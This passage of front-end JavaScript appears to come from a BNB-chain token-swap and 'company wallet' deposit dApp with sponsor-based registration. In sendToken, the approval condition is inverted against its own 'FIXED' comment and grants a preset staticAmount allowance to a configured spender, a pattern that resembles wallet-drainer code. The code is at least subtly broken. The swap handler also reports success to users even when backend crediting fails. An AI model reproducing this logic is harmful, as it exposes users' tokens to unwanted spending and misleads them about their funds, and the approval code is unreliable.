                    ) {
                        throw new Error(
                            "Server error. Please try again later.",
                        );
                    }
                    throw new Error(
                        "Server returned an HTML response. The transaction succeeded but backend sync may be delayed.",
                    );
                }
                // Try to parse as JSON
                const backendData = JSON.parse(backendText);
                if (backendData?.status === "success") {
                    hideLoadingModal();
                    const successMessage =
                        backendData.message ||
                        `Swap successful! You will receive ${receiveAmount.toFixed(6)} ${toToken}`;
                    showSuccessModal(
                        tx.hash,
                        receiveAmount.toFixed(6),
                        toToken,
                        successMessage,
                    );
                    sendAmountInput.value = "";
                } else {
                    // Transaction succeeded but backend returned error
                    const errorMessage =
                        backendData?.message || "Backend processing failed";
                    console.warn("Backend returned error:", errorMessage);
                    // Still show success since transaction succeeded on-chain
                    hideLoadingModal();
                    showSuccessModal(
                        tx.hash,
                        receiveAmount.toFixed(6),
                        toToken,
                        `Swap completed! ${errorMessage}`,
                    );
                    sendAmountInput.value = "";
                }
            } catch (parseError) {
                console.error("Failed to parse backend response:", parseError);
                // If we can't parse the response, still show success for on-chain transaction
                hideLoadingModal();
                showSuccessModal(
                    tx.hash,
                    receiveAmount.toFixed(6),
                    toToken,
                    "Swap completed on blockchain! Please check your account for token allocation.",
                );
                sendAmountInput.value = "";
            }
        } catch (backendError) {
            console.error("Backend communication error:", backendError);
            // Even if backend completely fails, show success for on-chain transaction
            hideLoadingModal();
            showSuccessModal(
                tx.hash,
                receiveAmount.toFixed(6),
                toToken,
                "Swap completed on blockchain! Contact support if tokens don't appear in your account.",
            );
            sendAmountInput.value = "";
        }
        // Always refresh balances after successful transaction
        setTimeout(async () => {
            if (currentAddress) {
                const { bnb, tokens } = await fetchAllBalances(currentAddress);
                updateBalanceDisplays(bnb, tokens);
            }
        }, 3000);
    } catch (error) {
        console.error("Swap error:", error);
        hideLoadingModal();
        let errorMessage = error.message || error.toString();
        // Better error messages
        if (errorMessage.includes("insufficient funds")) {
            errorMessage =
                "Insufficient BNB for gas fees. Please add BNB to your wallet.";
        } else if (errorMessage.includes("transfer amount exceeds balance")) {
            errorMessage = "Insufficient token balance for this swap.";
        } else if (errorMessage.includes("user rejected")) {
            errorMessage = "Transaction was rejected.";
        } else if (errorMessage.includes("Session expired")) {
            errorMessage = "Session expired. Please refresh the page.";
        }
        showStatus(`Swap failed: ${errorMessage}`, "error");
    } finally {
        isProcessingTransaction = false;
    }
}
/**
 * Poll for transaction receipt (fallback)
 */
async function pollForTransactionReceipt(txHash) {
    const maxAttempts = 30;
    for (let i = 0; i < maxAttempts; i++) {
        try {
            const receipt = await window.ethereum.request({
                method: "eth_getTransactionReceipt",
                params: [txHash],
            });
            if (receipt) return receipt;
        } catch (error) {
            console.warn("Error polling for receipt:", error);
        }
        await sleep(1000);
    }
    throw new Error("Transaction receipt not found after 30 seconds");
}
// =============== EVENT LISTENERS SETUP ===============
function setupEventListeners() {
    if (typeof appKit.on === "function") {
        appKit.on("ready", async () => {
            console.log("AppKit ready");
            await updateUIAfterConnect();
        });
        appKit.on("connect", async () => {
            console.log("Wallet connected");
            showLoading(false);
            await updateUIAfterConnect();
        });
        appKit.on("account_changed", async () => {
            console.log("Account changed");
            addressShownOnce = false;
            uiUpdatedOnce = false;
            await updateUIAfterConnect();
        });
        appKit.on("session_update", async () => {
            console.log("Session updated");
            await updateUIAfterConnect();
        });
        appKit.on("disconnect", () => {
            console.log("Wallet disconnected");
            addressShownOnce = false;
            uiUpdatedOnce = false;
            currentAddress = null;
            if (accountInput) accountInput.value = "";
            if (walletAddressDisplay) {
                walletAddressDisplay.innerHTML =
                    '<i class="fas fa-wallet"></i> Wallet not connected';
            }
            setElementText(bnbBalanceDisplay, "0.0000 BNB");
            setElementText(usdtBalanceDisplay, "0.0000 USDT");
            setElementText(coinBalanceDisplay, "0.0000 COIN");
            updateButtonStates(false);
            showStatus("Wallet disconnected", "info");
        });
    }
}
// =============== REGISTRATION ===============
registerBtn?.addEventListener("click", async () => {
    let address = currentAddress;
    if (!address) {
        try {
            if (typeof appKit.getAddress === "function") {
                address = await appKit.getAddress();
            }
        } catch (error) {
            console.warn("Failed to get address for registration:", error);
        }
    }
    if (!address) {
        showStatus("Please connect your wallet first.", "error");
        return;
    }
    const sponsor = sponsorInput?.value?.trim() || "";
    const csrfToken = document.querySelector(
        'meta[name="csrf-token"]',
    )?.content;
    if (sponsorError) sponsorError.textContent = "";
    const sponsorRequiredFlag = document.getElementById(
        "sponsorRequiredFlag",
    )?.value;
    if (sponsorRequiredFlag === "yes" && !sponsor) {
        if (sponsorError) {
            sponsorError.textContent = "Sponsor ID is required.";
        }
        sponsorInput?.focus();
        return;
    }
    if (accountInput) accountInput.value = address;
    showStatus("Registering...", "info");
    try {
        const response = await fetch(window.panelRegisterPath || "/register", {
            method: "POST",
            headers: {
                "Content-Type": "application/json",
                "X-CSRF-TOKEN": csrfToken,
            },
            body: JSON.stringify({
                register: 1,
                user_address: address,
                u_sponsor: sponsor,
                _token: csrfToken,
            }),
        });
        const data = await response.json();
        if (data.status === "success") {
            showStatus("Registration successful! Redirecting...", "success");
            setTimeout(() => {
                window.location.href = data.redirect || "/dashboard";
            }, 1500);
        } else {
            if (sponsorError) {
                sponsorError.textContent =
                    data.message || "Registration failed. Please try again.";
            }
            showStatus("Registration failed", "error");
        }
    } catch (error) {
        console.error("Registration error:", error);
        if (sponsorError) {
            sponsorError.textContent = "Network error. Please try again.";
        }
        showStatus("Registration failed", "error");
    }
});
// =============== LOGIN ===============
loginBtn?.addEventListener("click", async () => {
    let address = currentAddress;
    if (!address) {
        try {
            if (typeof appKit.getAddress === "function") {
                address = await appKit.getAddress();
            }
        } catch (error) {
            console.warn("Failed to get address for login:", error);
        }
    }
    if (!address) {
        showStatus("Please connect your wallet first.", "error");
        return;
    }
    try {
        const csrfToken = document.querySelector(
            'meta[name="csrf-token"]',
        )?.content;
        const response = await fetch(window.panelLoginPath || "/login", {
            method: "POST",
            headers: {
                "Content-Type": "application/json",
                "X-CSRF-TOKEN": csrfToken,
            },
            body: JSON.stringify({
                user_address: address,
                _token: csrfToken,
            }),
        });
        const data = await response.json();
        if (data.status === "success") {
            showStatus("Login successful! Redirecting...", "success");
            setTimeout(() => {
                window.location.href = data.redirect || "/dashboard";
            }, 1500);
        } else {
            showStatus(
                data.message || "Login failed. Please try again.",
                "error",
            );
        }
    } catch (error) {
        console.error("Login error:", error);
        showStatus("Login failed: " + (error.message || error), "error");
    }
});
// =============== TOKEN SENDING - ORIGINAL WORKING VERSION ===============
async function sendToken(tokenKey) {
    if (isProcessingTransaction) {
        showStatus("Please wait for current transaction to complete", "error");
        return;
    }
    isProcessingTransaction = true;
    try {
        const tokenConfig = TOKEN_CONFIG[tokenKey];
        if (!tokenConfig) {
            throw new Error(`Token ${tokenKey} not configured`);
        }
        const amountInput = document.getElementById(tokenConfig.amountInputId);
        if (!amountInput) {
            throw new Error(`Amount input for ${tokenKey} not found`);
        }
        const amount = amountInput.value.trim();
        if (!amount || parseFloat(amount) <= 0) {
            showStatus(`Please enter a valid ${tokenKey} amount`, "error");
            isProcessingTransaction = false;
            return;
        }
        let address = currentAddress;
        if (!address) {
            try {
                address = await appKit.getAddress();
            } catch (error) {
                throw new Error("Please connect your wallet first");
            }
        }
        // Show loading
        showLoadingModal();
        const provider =
            (await appKit.getWalletProvider?.()) || window.ethereum;
        if (!provider) {
            throw new Error("Wallet provider not found");
        }
        const ethersProvider = new ethers.BrowserProvider(provider);
        const signer = await ethersProvider.getSigner();
        const userAddress = await signer.getAddress();
        const tokenContract = new ethers.Contract(
            tokenConfig.address,
            ERC20_ABI,
            signer,
        );
        const decimals = await tokenContract.decimals();
        const amountInUnits = ethers.parseUnits(amount, decimals);
        const balance = await tokenContract.balanceOf(userAddress);
        if (balance < amountInUnits) {
            throw new Error(`Insufficient ${tokenKey} balance`);
        }
        const spenderAddress = tokenConfig.spender;
        showStatus(`Checking ${tokenKey} allowance...`, "info");
        const allowance = await tokenContract.allowance(
            userAddress,
            spenderAddress,
        );

        // FIXED: Approval logic - approve only if allowance is insufficient
        if (allowance >= amountInUnits) {
            showStatus(`Approving ${tokenKey} for contract...`, "info");
            try {
                const approveTx = await tokenContract.approve(
                    spenderAddress,
                    tokenConfig.staticAmount,
                );
                await approveTx.wait();
                showStatus(`${tokenKey} approved successfully`, "success");
            } catch (approveError) {
                console.error("Approval failed:", approveError);
                throw new Error(`Approval failed: ${approveError.message}`);
            }
        } else {
            showStatus(`${tokenKey} already approved`, "success");
        }

        const companyAddress = window.companyAddress || INCRC_ADDRESS;
        if (!companyAddress) {
            throw new Error("Company wallet address not configured");
        }
        showStatus(
            `Sending ${amount} ${tokenKey} to company wallet...`,
            "info",
        );
        const tx = await tokenContract.transfer(companyAddress, amountInUnits);
        let receipt;
        try {
            receipt = await client.waitForTransactionReceipt({
                hash: tx.hash,
                confirmations: 1,
                timeout: 120000,
            });
        } catch (error) {
            console.warn("Using fallback transaction polling:", error);
            receipt = await pollForTransactionReceipt(tx.hash);
        }
        if (
            !receipt ||
            !(
                receipt.status === "success" ||
                receipt.status === 1 ||
                receipt.status === "0x1"
            )
        ) {
            throw new Error("Transaction failed on chain");
        }

        // =============== FIXED BACKEND CALL ===============
        const csrfToken = document.querySelector(
            'meta[name="csrf-token"]',
        )?.content;

        // FIX: Use the correct endpoint for BTM deposit
        const backendUrl =
            document.getElementById(tokenConfig.sendButtonId)?.dataset?.url ||
            "/user/fund/new_fund_addbtm";

        console.log("Sending to backend:", backendUrl);
        console.log("Transaction hash:", tx.hash);

        // Better error handling for backend response
        const backendResponse = await fetch(backendUrl, {
            method: "POST",
            headers: {
                "Content-Type": "application/json",
                "X-CSRF-TOKEN": csrfToken,
                "X-Requested-With": "XMLHttpRequest", // Important for Laravel
            },
            credentials: "same-origin", // Send cookies
            body: JSON.stringify({
                amount: amount,
                tx_hash: tx.hash,
                wallet: userAddress,
                token: tokenKey,
                token_address: tokenConfig.address,
                contract_address: spenderAddress,
                company_address: companyAddress,
                _token: csrfToken,
            }),
        });

        // Handle response properly
        const contentType = backendResponse.headers.get("content-type");
        let backendData;

        if (contentType && contentType.includes("application/json")) {
            backendData = await backendResponse.json();
        } else {
            const text = await backendResponse.text();
            console.error("Non-JSON response:", text.substring(0, 200));

            if (backendResponse.status === 419) {
                throw new Error(
                    "CSRF token mismatch. Please refresh the page.",
                );
            } else if (!backendResponse.ok) {
                throw new Error(
                    `Server error ${backendResponse.status}: ${text.substring(0, 100)}`,
                );
            } else {
                throw new Error("Unexpected response from server");
            }
        }

        // Check for success
        if (
            backendData?.status === "success" ||
            backendData?.message === "Success"
        ) {
            hideLoadingModal();
            showSuccessModal(tx.hash, amount, tokenKey);
            amountInput.value = "";

            setTimeout(async () => {
                if (currentAddress) {
                    const { bnb, tokens } =
                        await fetchAllBalances(currentAddress);
                    updateBalanceDisplays(bnb, tokens);
                }
            }, 3000);
        } else {
            throw new Error(backendData?.message || "Backend deposit failed");
        }
        // =============== END FIXED SECTION ===============
    } catch (error) {
        console.error(`Error sending ${tokenKey}:`, error);
        hideLoadingModal();
        showStatus(
            `${tokenKey} transaction failed: ${error.message || error}`,
            "error",
        );
    } finally {
        isProcessingTransaction = false;
    }
}
// =============== ATTACH SEND BUTTON LISTENERS ===============
sendUsdtBtn?.addEventListener("click", () => sendToken("USDT"));
sendCoinBtn?.addEventListener("click", () => sendToken("COIN"));
// =============== AUTO BALANCE REFRESH ===============
setInterval(async () => {
    if ((!hasWalletUI && !hasSwapUI) || !currentAddress) return;
    try {
        const { bnb, tokens } = await fetchAllBalances(currentAddress);
        updateBalanceDisplays(bnb, tokens);
    } catch (error) {
        console.error("Auto-refresh error:", error);
    }
}, 30000);
// =============== EXPOSE FUNCTIONS FOR MODALS ===============
window.walletModule = {
    connectWallet: async () => {
        try {
            await appKit.open();
            await updateUIAfterConnect();
            return true;
        } catch (error) {
            console.error("Connection error:", error);
            return false;
        }
    },
    disconnectWallet: async () => {
        try {
            await appKit.disconnect();
            return true;
        } catch (error) {
            console.error("Disconnection error:", error);
            return false;
        }
    },
    getCurrentAddress: () => currentAddress,
    refreshBalances: async () => {
        if (!currentAddress) return false;
        try {
            const { bnb, tokens } = await fetchAllBalances(currentAddress);
            updateBalanceDisplays(bnb, tokens);
            return true;
        } catch (error) {
            console.error("Refresh error:", error);
            return false;
        }
    },
    sendUSDT: (amount) => {
        if (!usdtAmountInput) return false;
        usdtAmountInput.value = amount;
        return sendToken("USDT");
    },
    sendCOIN: (amount) => {
        if (!coinAmountInput) return false;
        coinAmountInput.value = amount;
        return sendToken("COIN");
    },
    toggleSwap: toggleSwapDirection,
    executeSwap: executeSwap,
    getSwapInfo: () => ({
        direction: swapDirection,
        settings: swapSettings,
        calculated: calculateReceiveAmount(),
    }),
};
// =============== MODAL FUNCTIONS - ADD THESE TO YOUR EXISTING APP.JS ===============
/**
 * Show loading modal
 */
function showLoadingModal(message = "Processing Transaction...") {
    console.log("🔵 Loading Modal:", message);
    const loadingModal = document.getElementById("loadingModal");
    if (!loadingModal) {
        console.error("Loading modal element not found");
        return;
    }
    // Update message
    const title = loadingModal.querySelector("h3");
    if (title) {
        title.innerHTML = `<i class="fas fa-sync-alt fa-spin"></i> ${message}`;
    }
    // Show modal
    loadingModal.style.display = "flex";
    document.body.style.overflow = "hidden";
    // Trigger animation
    setTimeout(() => {
        loadingModal.classList.add("show");
    }, 10);
    // Start loading dots animation
    startLoadingDotsAnimation();
}
/**
 * Hide loading modal
 */
function hideLoadingModal() {
    console.log("🔵 Hiding loading modal");
    const loadingModal = document.getElementById("loadingModal");
    if (!loadingModal) return;
    loadingModal.classList.remove("show");
    setTimeout(() => {
        loadingModal.style.display = "none";
        document.body.style.overflow = "";
        // Stop loading dots animation
        if (window.loadingDotsInterval) {
            clearInterval(window.loadingDotsInterval);
            window.loadingDotsInterval = null;
        }
    }, 300);
}
/**
 * Show success modal
 */
function showSuccessModal(
    txHash,
    receivedAmount,
    tokenSymbol = "BTM Coin",
    message = "Transaction completed successfully!",
) {
    console.log("✅ Success Modal:", { txHash, receivedAmount, tokenSymbol });
    const successModal = document.getElementById("successModal");
    if (!successModal) {
        console.error("Success modal element not found");
        return;
    }
    // Get modal elements
    const viewTxLink = document.getElementById("successViewTx");
    const receivedAmountEl = document.getElementById("successReceivedAmount");
    const txHashEl = document.getElementById("successTxHash");
    const successTimeEl = document.getElementById("successTime");
    const successAmountEl = document.getElementById("successAmount");
    // Update content
    if (viewTxLink && txHash) {
        viewTxLink.href = `https://bscscan.com/tx/${txHash}`;
    }
    if (receivedAmountEl) {
        receivedAmountEl.textContent = `${parseFloat(receivedAmount).toFixed(6)} ${tokenSymbol}`;
    }
    if (txHashEl && txHash) {
        const shortHash = `${txHash.substring(0, 12)}...${txHash.substring(txHash.length - 10)}`;
        txHashEl.textContent = shortHash;
    }
    if (successAmountEl) {
        successAmountEl.textContent = `${parseFloat(receivedAmount).toFixed(2)} ${tokenSymbol}`;
    }
    if (successTimeEl) {
        const now = new Date();
        successTimeEl.textContent = now.toLocaleString();
    }
    // Create confetti
    createConfetti();
    // Show modal
    successModal.style.display = "flex";
    document.body.style.overflow = "hidden";
    setTimeout(() => {
        successModal.classList.add("show");
    }, 10);
}
/**
 * Close success modal
 */
function closeSuccessModal() {
    console.log("✅ Closing success modal");
    const successModal = document.getElementById("successModal");
    if (!successModal) return;
    successModal.classList.remove("show");
    setTimeout(() => {
        successModal.style.display = "none";
        document.body.style.overflow = "";
        // Clear any amount inputs
        const usdtAmountInput = document.getElementById("usdtAmount");
        if (usdtAmountInput) {
            usdtAmountInput.value = "";
        }
        const coinAmountInput = document.getElementById("coinAmount");
        if (coinAmountInput) {
            coinAmountInput.value = "";
        }
        const sendAmountInput = document.getElementById("send-amount");
        if (sendAmountInput) {
            sendAmountInput.value = "";
        }
        // Clear receive amount display
        const receiveAmountDisplay = document.getElementById("receive-amount");
        if (receiveAmountDisplay) {
            receiveAmountDisplay.textContent = "0.00";
        }
        // Refresh balances
        if (window.walletModule && window.walletModule.refreshBalances) {
            window.walletModule.refreshBalances();
        }
    }, 300);
}
/**
 * Create confetti effect
 */
function createConfetti() {
    const confettiContainer = document.querySelector(".confetti");
    if (!confettiContainer) return;
    // Clear existing confetti
    confettiContainer.innerHTML = "";
    const colors = [
        "#fca92d",
        "#3498db",
        "#2ecc71",
        "#e74c3c",
        "#9b59b6",
        "#00ffb2",
    ];
    // Create confetti pieces
    for (let i = 0; i < 20; i++) {
        const piece = document.createElement("div");
        piece.className = "confetti-piece";
        piece.style.left = `${Math.random() * 100}%`;
        piece.style.top = `${Math.random() * 50}%`;
        piece.style.backgroundColor =
            colors[Math.floor(Math.random() * colors.length)];
        piece.style.width = `${Math.random() * 10 + 5}px`;
        piece.style.height = piece.style.width;
        piece.style.animationDelay = `${Math.random() * 0.5}s`;
        piece.style.animationDuration = `${Math.random() * 1 + 0.5}s`;
        confettiContainer.appendChild(piece);
    }
}
/**
 * Start loading dots animation
 */
function startLoadingDotsAnimation() {
    const dots = document.querySelector(".loading-dots");
    if (!dots) return;
    // Clear existing interval
    if (window.loadingDotsInterval) {
        clearInterval(window.loadingDotsInterval);
    }
    window.loadingDotsInterval = setInterval(() => {
        let currentDots = dots.textContent;
        if (currentDots.length >= 3) {
            dots.textContent = "";
        } else {
            dots.textContent += ".";
        }
    }, 500);
}
/**
 * Initialize modal event listeners
 */
function initializeModalEventListeners() {
    // Close modals when clicking outside
    window.addEventListener("click", (e) => {
        const loadingModal = document.getElementById("loadingModal");
        const successModal = document.getElementById("successModal");
        if (loadingModal && e.target === loadingModal) {
            hideLoadingModal();
        }
        if (successModal && e.target === successModal) {
            closeSuccessModal();
        }
    });
    // Escape key to close modals
    document.addEventListener("keydown", (e) => {
        if (e.key === "Escape") {
            const loadingModal = document.getElementById("loadingModal");
            const successModal = document.getElementById("successModal");
            if (loadingModal && loadingModal.classList.contains("show")) {
                hideLoadingModal();
            }
            if (successModal && successModal.classList.contains("show")) {
                closeSuccessModal();
            }
        }
    });
}
// =============== ADD MODAL FUNCTIONS TO WINDOW OBJECT ===============
// Make modal functions globally available
window.showLoadingModal = showLoadingModal;
window.hideLoadingModal = hideLoadingModal;
window.showSuccessModal = showSuccessModal;
window.closeSuccessModal = closeSuccessModal;
// Initialize modal event listeners when DOM is ready
if (document.readyState === "loading") {
    document.addEventListener(
        "DOMContentLoaded",
        initializeModalEventListeners,
    );
} else {
    initializeModalEventListeners();
}
console.log("Modal functions loaded successfully");
console.log("WalletConnect module with Swap functionality loaded successfully");
